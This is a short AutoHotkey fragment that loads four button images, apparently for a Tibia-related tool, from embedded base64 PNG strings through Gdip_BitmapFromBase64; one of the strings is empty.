A_Args.PNG.CTA          := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.HCTA         := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.Tibia        := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.HTibia       := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
